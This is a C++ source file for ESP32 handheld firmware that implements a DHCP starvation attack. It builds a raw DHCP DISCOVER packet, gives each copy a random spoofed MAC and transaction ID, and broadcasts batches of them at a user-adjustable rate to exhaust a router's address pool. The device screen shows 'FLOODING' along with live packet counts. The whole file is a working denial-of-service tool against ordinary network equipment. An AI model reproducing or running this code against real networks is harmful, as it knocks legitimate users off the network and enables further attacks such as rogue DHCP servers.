// ═══════════════════════════════════════════════════════════
// Arsenal - DHCP Starvation
// Floods DHCP DISCOVER packets with random MACs
// Exhausts the router's DHCP pool
// ═══════════════════════════════════════════════════════════

#include "arsenal.h"
#include "core/display.h"
#include "core/mykeyboard.h"
#include <WiFi.h>
#include <WiFiUdp.h>
#include <esp_task_wdt.h>
#include <globals.h>

static const uint16_t DHCP_SERVER_PORT = 67;
static const uint16_t DHCP_CLIENT_PORT = 68;

// Minimal DHCP DISCOVER packet
static uint8_t dhcp_discover[] = {
    0x01,                               // op: BOOTREQUEST
    0x01,                               // htype: Ethernet
    0x06,                               // hlen: 6
    0x00,                               // hops
    0x00, 0x00, 0x00, 0x00,             // xid (randomized)
    0x00, 0x00,                         // secs
    0x80, 0x00,                         // flags: broadcast
    0x00, 0x00, 0x00, 0x00,             // ciaddr
    0x00, 0x00, 0x00, 0x00,             // yiaddr
    0x00, 0x00, 0x00, 0x00,             // siaddr
    0x00, 0x00, 0x00, 0x00,             // giaddr
    // chaddr (16 bytes) - MAC will be randomized
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    // sname (64 bytes)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    // file (128 bytes)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    // DHCP magic cookie
    0x63, 0x82, 0x53, 0x63,
    // Option 53: DHCP Message Type = DISCOVER
    0x35, 0x01, 0x01,
    // Option 55: Parameter Request List
    0x37, 0x04, 0x01, 0x03, 0x06, 0x0F,
    // End
    0xFF
};

void arsenal_dhcp_starvation(void) {
    ARSENAL_SAFE_RUN([]() {
        // Need WiFi in STA mode to send UDP
        if (WiFi.getMode() == WIFI_MODE_NULL) {
            WiFi.mode(WIFI_STA);
        }

        WiFiUDP udp;
        int packetsSent = 0;
        unsigned long startTime = millis();
        bool running = true;
        int speed = 10;  // packets per batch

        while (running) {
            drawMainBorderWithTitle("DHCP Starvation");

            int padX = 12;
            int y = 45;

            tft.setTextColor(TFT_RED, bruceConfig.bgColor);
            tft.setTextSize(FM);
            tft.drawCentreString("FLOODING", tftWidth / 2, y, 1);
            y += 24;

            tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
            tft.setTextSize(FP);

            tft.setCursor(padX, y);
            tft.printf("Packets sent: %d", packetsSent);
            y += 14;

            unsigned long elapsed = (millis() - startTime) / 1000;
            tft.setCursor(padX, y);
            tft.printf("Elapsed: %lus", elapsed);
            y += 14;

            tft.setCursor(padX, y);
            tft.printf("Rate: ~%d pkt/s", speed * 5);
            y += 14;

            tft.setCursor(padX, y);
            tft.printf("Speed: %d (Up/Down)", speed);

            tft.setTextColor(TFT_RED, bruceConfig.bgColor);
            tft.drawCentreString("Esc to stop", tftWidth / 2, tftHeight - 20, 1);

            // Send batch of DHCP DISCOVER packets
            for (int i = 0; i < speed; i++) {
                // Randomize MAC in packet
                for (int m = 0; m < 6; m++) {
                    dhcp_discover[28 + m] = random(256);
                }
                dhcp_discover[28] |= 0x02;  // locally administered
                dhcp_discover[28] &= 0xFE;  // unicast

                // Randomize transaction ID
                for (int x = 0; x < 4; x++) {
                    dhcp_discover[4 + x] = random(256);
                }

                udp.beginPacket(IPAddress(255, 255, 255, 255), DHCP_SERVER_PORT);
                udp.write(dhcp_discover, sizeof(dhcp_discover));
                udp.endPacket();
                packetsSent++;
            }

            // Handle input
            if (check(EscPress)) {
                running = false;
                break;
            }
            if (check(UpPress) || check(NextPress)) {
                speed += 5;
                if (speed > 100) speed = 100;
            }
            if (check(DownPress) || check(PrevPress)) {
                speed -= 5;
                if (speed < 1) speed = 1;
            }

            esp_task_wdt_reset();
            delay(200);
        }

        udp.stop();
        displayRedStripe("Stopped");
        delay(1000);
    });
}
